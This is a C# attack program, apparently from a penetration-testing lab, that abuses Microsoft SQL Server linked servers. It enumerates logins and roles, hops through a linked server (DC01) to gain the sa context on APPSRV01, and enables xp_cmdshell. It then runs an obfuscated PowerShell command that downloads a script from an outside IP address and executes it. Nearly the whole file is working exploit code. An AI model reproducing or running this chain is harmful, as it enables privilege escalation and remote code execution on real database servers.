using System;
using System.Data.SqlClient;

namespace LinkedSQLServer_PE
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "appsrv01.corp1.com";
            String database = "master";

            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("[+] Authenticated to MSSQL Server \"" + sqlServer + "\" successfully!");
            }
            catch
            {
                Console.WriteLine("[-] Authentication to MSSQL Server \"" + sqlServer + "\" failed!");
                Environment.Exit(0);
            }

            String querylogin = "SELECT SYSTEM_USER;";
            SqlCommand command = new SqlCommand(querylogin, con);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Logged in as: " + reader[0]);
            reader.Close();

            String queryuser = "SELECT USER_NAME();";
            command = new SqlCommand(queryuser, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Mapped to user: " + reader[0]);
            reader.Close();

            String querypublicrole = "SELECT IS_SRVROLEMEMBER('public');";
            command = new SqlCommand(querypublicrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            Int32 role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of \"public\" role!");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of \"public\" role!");
            }
            reader.Close();

            String querysysadminrole = "SELECT IS_SRVROLEMEMBER('sysadmin');";
            command = new SqlCommand(querysysadminrole, con);
            reader = command.ExecuteReader();
            reader.Read();
            role = Int32.Parse(reader[0].ToString());
            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of \"sysadmin\" role!");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of \"sysadmin\" role!");
            }
            reader.Close();

            String queryLoginsAllowImpersonation = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            command = new SqlCommand(queryLoginsAllowImpersonation, con);
            reader = command.ExecuteReader();
            while (reader.Read() == true)
            {
                Console.WriteLine("Logins that can be impersonated: \"" + reader[0] + "\"");
            }
            reader.Close();

            // Enumerate Servers Linked to the Current SQL Server :
            String EnumLinkedServers = "EXEC sp_linkedservers;";
            command = new SqlCommand(EnumLinkedServers, con);
            reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("Linked SQL server on \"" + sqlServer + "\": " + reader[0]);
            }
            reader.Close();

            // Find the Version of the SQL Server Instance on DC01 (DC01 Linked to the Current SQL Server) :
            String ShowVersion = "SELECT Version FROM OPENQUERY(\"dc01\", 'SELECT @@version AS Version')";
            command = new SqlCommand(ShowVersion, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Linked SQL Server (DC01) Version: " + reader[0]);
            reader.Close();

            // Execute sp_linkedservers on DC01 to Locate Links From DC01
            String EnumLinkedServers_DC01 = "EXEC ('sp_linkedservers') AT DC01;";
            command = new SqlCommand(EnumLinkedServers_DC01, con);
            reader = command.ExecuteReader();
            while (reader.Read())
            {
                Console.WriteLine("Linked SQL server on \"DC01\": " + reader[0]);
            }
            reader.Close();

            // Let's See Which Security Context We Are Executing in on DC01 (DC01 Linked to the Current SQL Server) :
            String SecurityContext = "SELECT MyUser FROM OPENQUERY(\"dc01\", 'SELECT SYSTEM_USER AS MyUser')";
            command = new SqlCommand(SecurityContext, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing as the login \"" + reader[0] + "\" on DC01");
            reader.Close();

            // Follow the Link to DC01 to Obtain the "SA" Login Security Context, Then Return Back Over the Link to APPSRV01
            String ComeHomeWithMe = "SELECT MyLogin FROM OPENQUERY(\"dc01\", 'SELECT MyLogin FROM OPENQUERY(\"appsrv01\", ''SELECT SYSTEM_USER AS MyLogin'')')";
            command = new SqlCommand(ComeHomeWithMe, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Executing as the login \"" + reader[0] + "\" on APPSRV01");
            reader.Close();

            // Gain Code Execution on APPSRV01
            String Enable_AdvOptions = "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE;'') AT APPSRV01') AT DC01";
            command = new SqlCommand(Enable_AdvOptions, con);
            reader = command.ExecuteReader();
            reader.Close();

            String Enable_xpcmd = "EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; RECONFIGURE;'') AT APPSRV01') AT DC01";
            command = new SqlCommand(Enable_xpcmd, con);
            reader = command.ExecuteReader();
            reader.Close();

            String ExecCmd = "EXEC ('EXEC (''xp_cmdshell ''''powershell.exe -exec bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEANwAwAC8AcgB1AG4ANgA0AC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='''';'') AT APPSRV01') AT DC01";
            command = new SqlCommand(ExecCmd, con);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("Result of command is: " + reader[0]);
            reader.Close();

            con.Close();
        }
    }
}